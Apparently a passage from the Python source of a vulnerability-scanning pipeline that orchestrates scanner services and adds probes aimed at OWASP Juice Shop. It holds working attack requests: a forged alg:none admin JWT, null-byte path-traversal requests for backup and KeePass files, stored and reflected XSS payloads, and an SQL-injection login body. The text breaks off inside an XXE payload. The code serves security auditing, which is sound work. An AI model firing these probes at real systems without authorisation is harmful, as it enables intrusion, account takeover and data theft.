"""
Pipeline de scan professionnel  --  architecture SaaS cybersecurite.

5 phases nettes :
  Phase 1  --  Recon          Shodan || Subfinder || Nmap || AbuseIPDB || VT     0 ->  25%
  Phase 2  --  Active Scan    ZAP || Nuclei (enrichi Nmap P1) || Dalfox        25 ->  55%
  Phase 3  --  Exploitation   FFUF || Katana || GitLeaks + SQLMap (conditionnel) 55 ->  75%
  Phase 4  --  Correlation    Correlator -> FP Reduction -> Risk Scoring        75 ->  90%
  Phase 5  --  SOC Dashboard  AI Analysis + SOC Report + recommandations       90 -> 100%

SQLMap ne tourne qu'en Phase 3 si ZAP (Phase 2), FFUF ou Katana detectent des parametres injectables.
Nuclei en Phase 2 est enrichi par les donnees Nmap (Phase 1).
"""
from __future__ import annotations

import asyncio
import json
import logging
import re
import uuid
from datetime import datetime
from typing import Any, Dict, List, Optional

import httpx
import redis as sync_redis
from sqlalchemy.exc import OperationalError as SAOperationalError

from app.workers.celery_app import celery_app
from app.workers.pipeline_context import PipelineContext
from app.config import settings

logger = logging.getLogger(__name__)

# a"EURa"EUR Circuit breaker budgets par phase a"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EUR
_PHASE1_MAX_SECONDS = 180   # 3 min   --  recon parallele
_PHASE2_MAX_SECONDS = 750   # 12.5 min -- Nuclei || FFUF || Dalfox en parallele -- budget = plus lent (Nuclei ~10min)
_PHASE3_MAX_SECONDS = 600   # 10 min  --  Groupe A parallele ~5min + Groupe B parallele ~4min


# a"EURa"EUR Appels aux microservices scanners a"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EUR


async def _call_subfinder(target: str, timeout: int = 120) -> Dict[str, Any]:
    """Asset Discovery: Subfinder (subdomains) + httpx (HTTP probing)."""
    # Subfinder needs a bare hostname/IP  --  strip scheme, port, and path.
    subfinder_host = re.sub(r"^https?://", "", target).split("/")[0].split(":")[0]
    default = {
        "target": target, "error": None,
        "subdomains": [], "subdomains_count": 0,
        "http_probes": [], "live_hosts": [], "live_count": 0,
        "technologies": [], "is_ip": False,
    }
    try:
        async with httpx.AsyncClient(timeout=httpx.Timeout(float(timeout + 30))) as client:
            resp = await client.post(
                f"{settings.SUBFINDER_URL}/discover",
                json={"target": subfinder_host, "timeout": timeout, "passive_only": True},
            )
            resp.raise_for_status()
            return resp.json()
    except httpx.ConnectError:
        default["error"] = "Subfinder service unavailable (container not running?)"
    except httpx.TimeoutException:
        default["error"] = "Subfinder service HTTP request timed out"
    except Exception as exc:
        default["error"] = str(exc)
    return default


async def _call_ffuf(
    target:       str,
    timeout:      int = 120,
    threads:      int = 5,
    wordlist:     str = "auto",
    auth_headers: Optional[Dict[str, Any]] = None,
    auth_cookies: Optional[Dict[str, Any]] = None,
) -> Dict[str, Any]:
    """Endpoint/directory discovery via FFUF."""
    default = {"target": target, "error": None, "endpoints": [], "total": 0, "by_status": {}, "by_category": {}}
    payload: Dict[str, Any] = {"target": target, "timeout": timeout, "threads": threads, "wordlist": wordlist}
    if auth_headers:
        payload["headers"] = auth_headers
    if auth_cookies:
        payload["cookies"] = auth_cookies
    try:
        async with httpx.AsyncClient(timeout=httpx.Timeout(float(timeout + 120))) as client:
            resp = await client.post(
                f"{settings.FFUF_URL}/scan",
                json=payload,
            )
            resp.raise_for_status()
            return resp.json()
    except httpx.ConnectError:
        default["error"] = "FFUF service unavailable"
    except httpx.TimeoutException:
        default["error"] = "FFUF service timed out"
    except Exception as exc:
        default["error"] = str(exc)
    return default


async def _call_sqlmap_enriched(
    target:         str,
    zap_result:     Dict[str, Any],
    ffuf_result:    Dict[str, Any],
    katana_result:  Dict[str, Any],
    timeout:        int = 150,
    auth_headers:   Optional[Dict[str, Any]] = None,
    auth_cookies:   Optional[Dict[str, Any]] = None,
    probe_pack_ids: Optional[List[str]] = None,
) -> Dict[str, Any]:
    """
    SQL injection assessment via SQLMap  --  enriched with params from ZAP/FFUF/Katana.
    Runs AFTER the parallel group so it has real endpoint/param data.
    """
    default = {"target": target, "error": None, "vulnerable": False, "findings": [], "total": 0, "api_fallback": False}

    # Defensive validation -- guard against empty/exception results from async gather
    if not isinstance(zap_result, dict):
        zap_result = {"endpoints": [], "form_params": [], "alerts": [], "total": 0, "by_risk": {}}
    if not isinstance(ffuf_result, dict):
        ffuf_result = {"endpoints": [], "by_severity": {}, "total": 0}
    if not isinstance(katana_result, dict):
        katana_result = {"api_endpoints": [], "endpoints": [], "urls_with_params": [], "total": 0}

    from urllib.parse import urlparse, parse_qs
    from app.services.probe_packs import resolve_probes as _resolve_probes

    # Probe packs FIRST -- always tested even when ZAP/FFUF/Katana find nothing
    _base_url   = target if target.startswith(("http://", "https://")) else f"http://{target}"
    _base_url   = _base_url.rstrip("/")
    _pack_ids   = probe_pack_ids if probe_pack_ids else ["generic_rest_api"]
    _pack_probes = _resolve_probes(_pack_ids, _base_url)
    endpoints: List[Dict[str, Any]] = list(_pack_probes)
    logger.info(
        "[ProbePacks] Selected: %s -- %d probe(s) inserted at priority position 0",
        ", ".join(_pack_ids), len(_pack_probes),
    )

    # Append ZAP endpoints
    for ep in zap_result.get("endpoints", [])[:40]:
        url    = ep.get("url", "")
        method = ep.get("method", "GET")
        param  = ep.get("param", "")
        if not url:
            continue
        try:
            get_params = [k for k in parse_qs(urlparse(url).query).keys()]
        except Exception:
            get_params = []
        all_params = list(dict.fromkeys(get_params + ([param] if param else [])))
        if all_params or method.upper() == "POST":
            endpoints.append({"url": url, "method": method, "params": all_params, "data": ""})

    # a"EURa"EUR Form params from ZAP a"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EUR
    form_params = zap_result.get("form_params", [])[:20]

    # a"EURa"EUR Extra URLs from FFUF (param-bearing + sensitive) + Katana a"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EUR
    extra_urls: List[str] = []
    # FFUF endpoints qui portent des parametres GET (?x=y) -> cibles SQLi directes
    for ep in ffuf_result.get("endpoints", [])[:80]:
        u = ep.get("url", "")
        if u:
            try:
                if parse_qs(urlparse(u).query):
                    extra_urls.append(u)
            except Exception:
                pass
    # FFUF sensitive paths (admin, config, etc.) -- widened from critical+high
    # to also include medium (generic /api/, /rest/ paths land here, not in
    # critical/high which are reserved for credential/secret-file patterns).
    _ffuf_sensitive = (ffuf_result.get("by_severity", {}).get("critical", []) +
                       ffuf_result.get("by_severity", {}).get("high", []) +
                       ffuf_result.get("by_severity", {}).get("medium", []))[:15]
    extra_urls += [ep.get("url", "") for ep in _ffuf_sensitive]
    # FFUF params_accepted: param probing confirmed these endpoints actually
    # read the parameter server-side (response size changed). This is a stronger
    # signal than generic probes -- use the confirmed param names, not a
    # generic list.
    _ffuf_pa = [
        ep for ep in ffuf_result.get("endpoints", [])[:20]
        if ep.get("params_accepted")
    ]
    for _ep in _ffuf_pa:
        _u = _ep.get("url", "")
        if not _u:
            continue
        endpoints.append({
            "url":    _u,
            "method": "GET",
            "params": list(_ep["params_accepted"]),
            "data":   "",
        })
    logger.info(
        "[SQLMap] %d target(s) added from FFUF params_accepted",
        len(_ffuf_pa),
    )
    # Generic param probing: most of these sensitive paths are bare GET
    # endpoints with no "?param=" in their URL, so _build_target_list silently
    # drops them (GET without params is skipped). Re-test each as a few common
    # parameter names so the SQLi engine actually gets a chance on them.
    _GENERIC_TEST_PARAMS = ["id", "q", "search", "filter", "page"]
    for _ep in _ffuf_sensitive:
        _u = _ep.get("url", "")
        if _u and "?" not in _u:
            endpoints.append({
                "url":    _u,
                "method": "GET",
                "params": list(_GENERIC_TEST_PARAMS),
                "data":   "",
            })
    # Katana API endpoints
    extra_urls += katana_result.get("api_endpoints", [])[:10]
    # Katana endpoints with GET params
    for ep in katana_result.get("endpoints", [])[:30]:
        if ep.get("params"):
            extra_urls.append(ep.get("url", ""))
    extra_urls = [u for u in list(dict.fromkeys(extra_urls)) if u][:25]

    # API fallback: when ZAP/FFUF/Katana detect 0 injectable params on a REST/API target,
    # inject known endpoints so SQLMap can test them.
    # GET endpoints: (path_with_param, [param_names])
    _API_GET_ENDPOINTS = [
        ("/rest/products/search?q=test", ["q"]),   # primary SQLite LIKE injectable
        ("/api/Users?id=1", ["id"]),
        ("/api/Products?id=1", ["id"]),
    ]
    # POST endpoints: (path, [param_names], json_body)
    _API_POST_ENDPOINTS = [
        ("/rest/user/login",          [], '{"email":"*","password":"test"}'),
        ("/rest/user/change-password",["current", "new"],    '{"current":"test","new":"Test1234!","repeat":"Test1234!"}'),
        ("/api/Feedbacks",            ["comment"],           '{"comment":"test","rating":1}'),
    ]
    _zap_params_count  = (
        len([ep for ep in zap_result.get("endpoints", [])
             if parse_qs(urlparse(ep.get("url", "")).query)])
        + len(zap_result.get("form_params", []))
    )
    _ffuf_params_count = len([
        ep for ep in ffuf_result.get("endpoints", [])
        if ep.get("url") and parse_qs(urlparse(ep.get("url", "")).query)
    ])
    _katana_params_count = len(katana_result.get("urls_with_params", []))
    _total_detected_params = _zap_params_count + _ffuf_params_count + _katana_params_count

    _all_crawled_urls = (
        [ep.get("url", "") for ep in zap_result.get("endpoints", [])]
        + [ep.get("url", "") for ep in ffuf_result.get("endpoints", [])]
        + katana_result.get("api_endpoints", [])
    )
    _has_api_pattern = any("/api" in u or "/rest" in u for u in _all_crawled_urls)

    api_fallback = False
    if _total_detected_params == 0 and _has_api_pattern:
        api_fallback = True
        logger.info(
            "[SQLMap] API fallback triggered -- 0 params detected, target has REST/API endpoints. "
            "Adding %d GET + %d POST hardcoded endpoints.",
            len(_API_GET_ENDPOINTS), len(_API_POST_ENDPOINTS),
        )
        for _ep_path, _ep_params in _API_GET_ENDPOINTS:
            endpoints.append({
                "url":    f"{_base_url}{_ep_path}",
                "method": "GET",
                "params": _ep_params,
                "data":   "",
            })
        for _ep_path, _ep_params, _ep_data in _API_POST_ENDPOINTS:
            endpoints.append({
                "url":    f"{_base_url}{_ep_path}",
                "method": "POST",
                "params": _ep_params,
                "data":   _ep_data,
            })
    default["api_fallback"] = api_fallback

    # Auth-bypass probe: always test the login endpoint regardless of api_fallback or
    # param detection -- the boolean-based blind SQLi on /rest/user/login is the most
    # reliable finding on Juice Shop and must never be skipped.
    _login_url = f"{_base_url}/rest/user/login"
    _login_already = any(ep.get("url") == _login_url for ep in endpoints)
    if not _login_already and _has_api_pattern:
        endpoints.append({
            "url":    _login_url,
            "method": "POST",
            "params": [],
            "data":   '{"email":"*","password":"test"}',
        })

    # Always pass auth token; for API targets also inject Content-Type: application/json
    _merged_headers: Dict[str, Any] = dict(auth_headers or {})
    if api_fallback or _has_api_pattern:
        _merged_headers.setdefault("Content-Type", "application/json")

    try:
        _sqlmap_payload: Dict[str, Any] = {
            "target":      target,
            "timeout":     timeout,
            "endpoints":   endpoints[:20],
            "form_params": form_params,
            "extra_urls":  extra_urls,
        }
        if _merged_headers:
            _sqlmap_payload["headers"] = _merged_headers
        if auth_cookies:
            _sqlmap_payload["cookies"] = auth_cookies
        async with httpx.AsyncClient(timeout=httpx.Timeout(float(timeout + 30))) as client:
            resp = await client.post(
                f"{settings.SQLMAP_URL}/scan",
                json=_sqlmap_payload,
            )
            resp.raise_for_status()
            result = resp.json()
            result["api_fallback"] = api_fallback
            return result
    except httpx.ConnectError:
        default["error"] = "SQLMap service unavailable"
    except httpx.TimeoutException:
        default["error"] = "SQLMap service timed out"
    except Exception as exc:
        default["error"] = str(exc)
    return default


async def _call_gitleaks(target: str, timeout: int = 120) -> Dict[str, Any]:
    """Secrets detection via GitLeaks."""
    default = {"target": target, "error": None, "findings": [], "total": 0, "by_severity": {}}
    try:
        async with httpx.AsyncClient(timeout=httpx.Timeout(float(timeout + 30))) as client:
            resp = await client.post(
                f"{settings.GITLEAKS_URL}/scan",
                json={"target": target, "timeout": timeout},
            )
            resp.raise_for_status()
            return resp.json()
    except httpx.ConnectError:
        default["error"] = "GitLeaks service unavailable"
    except httpx.TimeoutException:
        default["error"] = "GitLeaks service timed out"
    except Exception as exc:
        default["error"] = str(exc)
    return default


async def _call_katana(target: str, timeout: int = 90) -> Dict[str, Any]:
    """JS/SPA web crawling via Katana  --  extracts hidden endpoints and API calls."""
    default = {
        "target": target, "error": None,
        "endpoints": [], "js_files": [], "api_endpoints": [],
        "params": [], "total": 0, "by_category": {},
    }
    try:
        async with httpx.AsyncClient(timeout=httpx.Timeout(float(timeout + 30))) as client:
            resp = await client.post(
                f"{settings.KATANA_URL}/scan",
                json={"target": target, "timeout": timeout, "depth": 3, "js_crawl": True},
            )
            resp.raise_for_status()
            return resp.json()
    except httpx.ConnectError:
        default["error"] = "Katana service unavailable (container not running?)"
    except httpx.TimeoutException:
        default["error"] = "Katana service HTTP request timed out"
    except Exception as exc:
        default["error"] = str(exc)
    return default


async def _call_nikto(
    target:       str,
    timeout:      int = 120,
    auth_headers: Optional[Dict[str, Any]] = None,
    auth_cookies: Optional[Dict[str, Any]] = None,
) -> Dict[str, Any]:
    """Web server scanner via Nikto microservice."""
    default = {"target": target, "error": None, "findings": [], "total": 0, "by_severity": {}}
    target_url = target if target.startswith(("http://", "https://")) else f"http://{target}"
    payload: Dict[str, Any] = {"target": target_url, "timeout": timeout}
    if auth_headers:
        payload["headers"] = auth_headers
    if auth_cookies:
        payload["cookies"] = auth_cookies
    try:
        async with httpx.AsyncClient(timeout=httpx.Timeout(float(timeout + 90))) as client:
            resp = await client.post(
                f"{settings.NIKTO_URL}/scan",
                json=payload,
            )
            resp.raise_for_status()
            return resp.json()
    except httpx.ConnectError:
        default["error"] = "Nikto service unavailable (container not running?)"
    except httpx.TimeoutException:
        default["error"] = "Nikto service HTTP request timed out"
    except Exception as exc:
        default["error"] = str(exc)
    return default


async def _call_wapiti(
    target:       str,
    timeout:      int = 130,
    auth_headers: Optional[Dict[str, Any]] = None,
    auth_cookies: Optional[Dict[str, Any]] = None,
) -> Dict[str, Any]:
    """Web application auditor via Wapiti microservice."""
    default = {"target": target, "error": None, "findings": [], "total": 0, "by_severity": {}}
    target_url = target if target.startswith(("http://", "https://")) else f"http://{target}"
    payload: Dict[str, Any] = {"target": target_url, "timeout": timeout}
    if auth_headers:
        payload["headers"] = auth_headers
    if auth_cookies:
        payload["cookies"] = auth_cookies
    try:
        async with httpx.AsyncClient(timeout=httpx.Timeout(float(timeout + 90))) as client:
            resp = await client.post(
                f"{settings.WAPITI_URL}/scan",
                json=payload,
            )
            resp.raise_for_status()
            return resp.json()
    except httpx.ConnectError:
        default["error"] = "Wapiti service unavailable (container not running?)"
    except httpx.TimeoutException:
        default["error"] = "Wapiti service HTTP request timed out"
    except Exception as exc:
        default["error"] = str(exc)
    return default


async def _call_idor(
    target:       str,
    endpoints:    Optional[List[str]] = None,
    timeout:      int = 120,
    auth_headers: Optional[Dict[str, Any]] = None,
    auth_cookies: Optional[Dict[str, Any]] = None,
    user_a_email: Optional[str] = None,
    user_a_id:    Optional[int] = None,
) -> Dict[str, Any]:
    """IDOR/Broken Access Control testing via two-account cross-access probe."""
    default = {
        "target": target, "error": None, "findings": [], "total": 0,
        "by_severity": {}, "skipped": False, "reason": None,
        "user_b_email": None, "user_b_id": None, "candidates_tested": 0,
    }
    target_url = target if target.startswith(("http://", "https://")) else f"http://{target}"
    payload: Dict[str, Any] = {
        "target": target_url,
        "timeout": timeout,
        "endpoints": (endpoints or [])[:40],
    }
    if auth_headers:
        payload["auth_headers"] = auth_headers
    if auth_cookies:
        payload["auth_cookies"] = auth_cookies
    if user_a_email:
        payload["user_a_email"] = user_a_email
    if user_a_id:
        payload["user_a_id"] = user_a_id
    try:
        async with httpx.AsyncClient(timeout=httpx.Timeout(float(timeout + 60))) as client:
            resp = await client.post(
                f"{settings.IDOR_URL}/scan",
                json=payload,
            )
            resp.raise_for_status()
            return resp.json()
    except httpx.ConnectError:
        default["error"] = "IDOR service unavailable (container not running?)"
        default["skipped"] = True
        default["reason"] = "service_unavailable"
    except httpx.TimeoutException:
        default["error"] = "IDOR service HTTP request timed out"
        default["skipped"] = True
        default["reason"] = "service_timeout"
    except Exception as exc:
        default["error"] = str(exc)
        default["skipped"] = True
        default["reason"] = "service_error"
    return default


async def _call_lab_challenges(target: str, timeout: int = 8) -> Dict[str, Any]:
    """Detect intentionally vulnerable lab challenge metadata when exposed."""
    target_url = target if target.startswith(("http://", "https://")) else f"http://{target}"
    target_url = target_url.rstrip("/")
    default = {
        "target": target_url,
        "detected": False,
        "platform": None,
        "endpoint": None,
        "challenges": [],
        "total": 0,
        "error": None,
    }

    async def _fetch_json(client: httpx.AsyncClient, path: str) -> Optional[Dict[str, Any]]:
        resp = await client.get(f"{target_url}{path}")
        if resp.status_code != 200:
            return None
        ctype = resp.headers.get("content-type", "")
        if "json" not in ctype.lower() and not resp.text.lstrip().startswith(("{", "[")):
            return None
        return resp.json()

    def _items(payload: Any) -> List[Dict[str, Any]]:
        if isinstance(payload, list):
            return [x for x in payload if isinstance(x, dict)]
        if not isinstance(payload, dict):
            return []
        candidates = [
            payload.get("data"),
            payload.get("challenges"),
            payload.get("items"),
        ]
        for candidate in candidates:
            if isinstance(candidate, list):
                return [x for x in candidate if isinstance(x, dict)]
            if isinstance(candidate, dict):
                nested = candidate.get("data") or candidate.get("challenges")
                if isinstance(nested, list):
                    return [x for x in nested if isinstance(x, dict)]
        return []

    try:
        async with httpx.AsyncClient(
            timeout=httpx.Timeout(float(timeout + 10)),
            verify=False,
            follow_redirects=True,
            headers={"User-Agent": "Mozilla/5.0 (compatible; AuditScan/3.0)"},
        ) as client:
            for path in ("/api/Challenges", "/api/challenges"):
                payload = await _fetch_json(client, path)
                challenges = _items(payload)
                if not challenges:
                    continue

                normalized: List[Dict[str, Any]] = []
                for idx, raw in enumerate(challenges[:120]):
                    name = (
                        raw.get("name") or raw.get("title") or raw.get("challenge")
                        or raw.get("key") or f"Challenge #{idx + 1}"
                    )
                    difficulty = raw.get("difficulty")
                    try:
                        difficulty_num = int(difficulty)
                    except (TypeError, ValueError):
                        difficulty_num = 0
                    normalized.append({
                        "id": raw.get("id") or raw.get("key") or idx + 1,
                        "name": str(name),
                        "category": raw.get("category") or raw.get("tag") or "lab",
                        "difficulty": difficulty_num,
                        "description": raw.get("description") or raw.get("hint") or "",
                        "solved": bool(raw.get("solved") or raw.get("isSolved")),
                    })

                return {
                    **default,
                    "detected": True,
                    "platform": "OWASP Juice Shop" if "Challenges" in path else "web lab",
                    "endpoint": f"{target_url}{path}",
                    "challenges": normalized,
                    "total": len(normalized),
                }
    except httpx.TimeoutException:
        default["error"] = "Lab challenge detection timed out"
    except Exception as exc:
        default["error"] = str(exc)[:200]
    return default


async def _probe_jwt_vulnerabilities(
    target: str,
    auth_headers: Optional[Dict[str, Any]] = None,
    timeout: float = 15.0,
) -> List[Dict[str, Any]]:
    """Test for JWT algorithm confusion and 'none' algorithm vulnerabilities."""
    import base64 as _b64, json as _json
    base = target.rstrip("/")
    findings: List[Dict[str, Any]] = []

    def _make_none_jwt(payload: dict) -> str:
        header = _b64.urlsafe_b64encode(_json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=").decode()
        body   = _b64.urlsafe_b64encode(_json.dumps(payload).encode()).rstrip(b"=").decode()
        return f"{header}.{body}."  # empty signature for alg:none

    # Craft an admin JWT with alg:none
    admin_payload = {"sub": "1", "email": "admin@juice-sh.op", "role": "admin", "iat": 1700000000}
    none_jwt = _make_none_jwt(admin_payload)

    probe_endpoints = [
        "/rest/user/whoami",
        "/api/Challenges?solved=true",
        "/rest/basket/1",
    ]
    async with httpx.AsyncClient(timeout=timeout, verify=False, follow_redirects=True) as client:
        for ep in probe_endpoints:
            try:
                r = await client.get(
                    f"{base}{ep}",
                    headers={"Authorization": f"Bearer {none_jwt}"},
                )
                if r.status_code == 200:
                    findings.append({
                        "type":     "auth_bypass",
                        "title":    "JWT None Algorithm Accepted — Authentication Bypass",
                        "severity": "critical",
                        "url":      f"{base}{ep}",
                        "payload":  none_jwt[:80] + "...",
                        "evidence": f"HTTP 200 returned with alg:none JWT on {ep}",
                        "cwe_ids":  ["CWE-347"],
                        "cve_ids":  [],
                        "source":   "jwt_probe",
                        "tags":     ["jwt", "auth_bypass", "broken_auth"],
                    })
                    logger.info("[JWT] alg:none bypass CONFIRMED on %s", ep)
                    break
            except Exception as exc:
                logger.debug("[JWT] probe %s: %s", ep, exc)

    return findings


async def _probe_ftp_null_byte(
    target: str,
    timeout: float = 20.0,
) -> List[Dict[str, Any]]:
    """Probe for null-byte bypass (%2500) on protected FTP/backup files."""
    base = target.rstrip("/")
    # Files protected with extension whitelist; %2500.md bypasses the filter
    probes = [
        ("ftp/package.json.bak%2500.md", "Forgotten Developer Backup — Null Byte Path Traversal"),
        ("ftp/eastere.gg%2500.md",        "Forgotten Sales Backup — Null Byte Path Traversal"),
        ("ftp/coupons_2013.md.bak%2500.md","Expired Coupon File — Null Byte Path Traversal"),
        ("ftp/suspicious_errors.yml%2500.md","Leaked Error Config — Null Byte Path Traversal"),
        ("ftp/incident-support.kdbx%2500.md","KeePass Database — Null Byte Path Traversal"),
    ]
    findings: List[Dict[str, Any]] = []
    async with httpx.AsyncClient(timeout=timeout, verify=False, follow_redirects=True) as client:
        for path, title in probes:
            try:
                r = await client.get(f"{base}/{path}")
                if r.status_code == 200 and len(r.content) > 0:
                    findings.append({
                        "type":     "exposure",
                        "title":    title,
                        "severity": "high",
                        "url":      f"{base}/{path}",
                        "payload":  path,
                        "evidence": f"HTTP 200 ({len(r.content)} bytes) via null-byte bypass %2500",
                        "cwe_ids":  ["CWE-22", "CWE-538"],
                        "cve_ids":  [],
                        "source":   "ftp_nullbyte_probe",
                        "tags":     ["path_traversal", "sensitive_data", "backup", "ftp"],
                    })
                    logger.info("[FTPNull] CONFIRMED %s (%d bytes)", path, len(r.content))
            except Exception as exc:
                logger.debug("[FTPNull] probe %s: %s", path, exc)
    return findings


def _solve_captcha(expr: str) -> int:
    """Evaluate simple arithmetic captcha expression (e.g. '3+6-1', '8*2')."""
    import re as _re
    safe = _re.sub(r"[^0-9+\-*/\s]", "", expr)
    try:
        return int(eval(safe))  # noqa: S307 — captcha arithmetic only, no user input
    except Exception:
        return -1


async def _probe_stored_xss(
    target: str,
    auth_headers: Optional[Dict[str, Any]] = None,
    timeout: float = 30.0,
) -> List[Dict[str, Any]]:
    """POST XSS/HTML-injection payloads to comment/feedback endpoints and verify reflection."""
    base = target.rstrip("/")
    marker = "auditscan_xss_9z7k"
    # <b> is allowed by DOMPurify → proves stored HTML injection (stored XSS vector)
    html_payload = f"<b>{marker}</b>"
    # Raw script payload — stored verbatim only if no server-side sanitisation
    script_payload = f"<script>/*{marker}*/</script>"
    findings: List[Dict[str, Any]] = []
    headers: Dict[str, str] = {"Content-Type": "application/json"}
    if auth_headers:
        headers.update({k: v for k, v in auth_headers.items()})

    async with httpx.AsyncClient(timeout=timeout, verify=False, follow_redirects=True) as client:
        # ── Juice Shop /api/Feedbacks (requires captcha) ──────────────────────
        try:
            cap_r = await client.get(f"{base}/rest/captcha", headers=auth_headers or {})
            if cap_r.status_code == 200:
                cap = cap_r.json()
                captcha_id = cap.get("captchaId", 0)
                # Use server-provided answer when available, otherwise eval expression
                captcha_ans = cap.get("answer") or str(_solve_captcha(cap.get("captcha", "0")))
                for payload, sev, tag in [
                    (html_payload,   "medium", "stored_html_injection"),
                    (script_payload, "high",   "stored_xss"),
                ]:
                    r_post = await client.post(
                        f"{base}/api/Feedbacks",
                        json={"captchaId": captcha_id, "captcha": str(captcha_ans),
                              "rating": 1, "comment": payload},
                        headers=headers,
                    )
                    if r_post.status_code not in (200, 201):
                        logger.debug("[StoredXSS] Feedbacks POST %d (payload=%s)", r_post.status_code, tag)
                        continue
                    stored = r_post.json().get("data", {}).get("comment", "")
                    if marker in stored:
                        r_get = await client.get(f"{base}/api/Feedbacks", headers=auth_headers or {})
                        if marker in r_get.text:
                            findings.append({
                                "type":     "xss",
                                "title":    f"Stored XSS: /api/Feedbacks comment field ({tag})",
                                "severity": sev,
                                "url":      f"{base}/api/Feedbacks",
                                "payload":  payload,
                                "evidence": f"Marker '{marker}' reflected via GET /api/Feedbacks",
                                "cwe_ids":  ["CWE-79"],
                                "cve_ids":  [],
                                "source":   "stored_xss_probe",
                                "tags":     ["xss", "stored_xss", "injection"],
                            })
                            logger.info("[StoredXSS] CONFIRMED (%s) at /api/Feedbacks", tag)
                            break  # one finding per endpoint is enough
                    # refresh captcha for next payload attempt
                    cap2 = await client.get(f"{base}/rest/captcha", headers=auth_headers or {})
                    if cap2.status_code == 200:
                        cap = cap2.json()
                        captcha_id = cap.get("captchaId", 0)
                        captcha_ans = cap.get("answer") or str(_solve_captcha(cap.get("captcha", "0")))
        except Exception as exc:
            logger.debug("[StoredXSS] /api/Feedbacks probe failed: %s", exc)

        # ── Generic comment endpoints ──────────────────────────────────────────
        _MAX_RETRIES = 3
        for ep in ("/api/comments", "/comments", "/api/posts"):
            for attempt in range(_MAX_RETRIES):
                try:
                    r_post = await client.post(
                        f"{base}{ep}",
                        json={"comment": html_payload, "text": html_payload, "body": html_payload},
                        headers=headers,
                    )
                    if r_post.status_code in (200, 201):
                        break
                    logger.warning("[ExtProbe] StoredXSS attempt %d/%d: HTTP %d",
                                   attempt + 1, _MAX_RETRIES, r_post.status_code)
                    await asyncio.sleep(2 * (attempt + 1))
                except Exception as exc:
                    logger.warning("[ExtProbe] StoredXSS attempt %d/%d error: %s",
                                   attempt + 1, _MAX_RETRIES, exc)
                    await asyncio.sleep(2)
            else:
                logger.warning("[ExtProbe] StoredXSS: all retries failed, skipping")
                continue
            try:
                r_get = await client.get(f"{base}{ep}", headers=auth_headers or {})
                if marker in r_get.text:
                    findings.append({
                        "type":     "xss",
                        "title":    f"Stored XSS: {ep} comment field",
                        "severity": "high",
                        "url":      f"{base}{ep}",
                        "payload":  html_payload,
                        "evidence": f"Marker '{marker}' reflected via GET {ep}",
                        "cwe_ids":  ["CWE-79"],
                        "cve_ids":  [],
                        "source":   "stored_xss_probe",
                        "tags":     ["xss", "stored_xss", "injection"],
                    })
                    logger.info("[StoredXSS] CONFIRMED at %s", ep)
            except Exception as exc:
                logger.debug("[StoredXSS] probe %s: %s", ep, exc)

    return findings


# ── New probes: Reflected XSS, XXE, SSRF, User Enum, Weak Pwd, Headers, Anti-auto ──


async def _probe_reflected_xss(
    target: str,
    timeout: float = 15.0,
) -> List[Dict[str, Any]]:
    """Test for DOM/Reflected XSS on search and Angular route params."""
    base = target.rstrip("/")
    findings: List[Dict[str, Any]] = []
    marker = "auditscan_rxss_7m3q"

    payloads = [
        (f"<iframe src=\"javascript:alert('{marker}')\">", "DOM XSS via iframe javascript: scheme"),
        (f"<img src=x onerror=\"alert('{marker}')\">",    "Reflected XSS via img onerror"),
        (f"<script>window['{marker}']=1</script>",          "Script tag injection"),
    ]

    async with httpx.AsyncClient(timeout=timeout, verify=False, follow_redirects=True) as client:
        for payload, desc in payloads:
            try:
                # Search API reflects the query in JSON response; Angular renders it without sanitization
                r = await client.get(f"{base}/rest/products/search", params={"q": payload})
                if r.status_code == 200 and payload in r.text:
                    findings.append({
                        "type":     "xss",
                        "title":    f"DOM/Reflected XSS — /rest/products/search ({desc})",
                        "severity": "high",
                        "url":      f"{base}/rest/products/search?q={payload[:40]}",
                        "payload":  payload,
                        "evidence": f"Payload reflected unescaped in JSON response: {r.text[:200]}",
                        "cwe_ids":  ["CWE-79"],
                        "cve_ids":  [],
                        "source":   "reflected_xss_probe",
                        "tags":     ["xss", "dom_xss", "reflected_xss", "angular"],
                    })
                    logger.info("[ReflectedXSS] CONFIRMED via search API (%s)", desc)
                    break
            except Exception as exc:
                logger.debug("[ReflectedXSS] search probe: %s", exc)

        # Test Angular hash route — /rest/products redirect
        for iframe_payload in [
            f"<iframe src=\"javascript:alert('{marker}')\">",
            f"<<script>alert('{marker}')<</script>",
        ]:
            try:
                r = await client.get(f"{base}/rest/products/search", params={"q": iframe_payload})
                if r.status_code == 200 and iframe_payload in r.text:
                    findings.append({
                        "type":     "xss",
                        "title":    "DOM XSS — Angular SPA search parameter unsanitized",
                        "severity": "high",
                        "url":      f"{base}/#/search?q={iframe_payload[:40]}",
                        "payload":  iframe_payload,
                        "evidence": "Search term reflected verbatim in /rest/products/search JSON → Angular renders without sanitization",
                        "cwe_ids":  ["CWE-79"],
                        "cve_ids":  [],
                        "source":   "dom_xss_probe",
                        "tags":     ["xss", "dom_xss", "angular", "spa"],
                    })
                    logger.info("[DomXSS] CONFIRMED via Angular search route")
                    break
            except Exception as exc:
                logger.debug("[DomXSS] route probe: %s", exc)

    return findings


async def _probe_xxe(
    target: str,
    timeout: float = 15.0,
) -> List[Dict[str, Any]]:
    """Test B2B XML endpoint for XXE (external entity injection)."""
    base = target.rstrip("/")
    findings: List[Dict[str, Any]] = []

    # Juice Shop B2B order endpoint accepts XML
    xxe_payloads = [
        (
            '<?xml version="1.0" encoding="UTF-8"?>'
